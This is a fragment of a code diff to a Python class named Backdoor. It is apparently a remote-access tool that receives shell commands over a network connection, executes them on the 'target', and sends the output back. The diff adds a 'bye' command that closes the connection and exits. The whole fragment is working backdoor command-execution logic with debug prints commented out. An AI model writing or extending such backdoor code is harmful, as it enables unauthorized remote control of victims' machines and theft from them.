@@ -51,17 +51,23 @@ class Backdoor:
             #print('run1')
             #cmdIn = cmdIn.decode()
             #print(cmdIn)
-            try:
-                #print('run3_TRY')
-                cmdOut = self.executeCmd(cmdIn)
-                #print('run4_TRY')
-                #print(cmdOut)
-                cmdOut = cmdOut.decode('utf-8')
-                #print(cmdOut)
-                self.sendStream(cmdOut)
-                #print('run5_TRYPOSTSEND')
-            except subprocess.CalledProcessError:
-                self.sendStream('Subprocess Error, shell command not accepted by target')
+            if cmdIn != 'bye':
+
+                try:
+                    #print('run3_TRY')
+                    cmdOut = self.executeCmd(cmdIn)
+                    #print('run4_TRY')
+                    #print(cmdOut)
+                    cmdOut = cmdOut.decode('utf-8')
+                    #print(cmdOut)
+                    self.sendStream(cmdOut)
+                    #print('run5_TRYPOSTSEND')
+                except subprocess.CalledProcessError:
+                    self.sendStream('Subprocess Error, shell command not accepted by target')
+            else:
+                #print('bye')
+                self.connection.close()
+                exit()
 
 
 
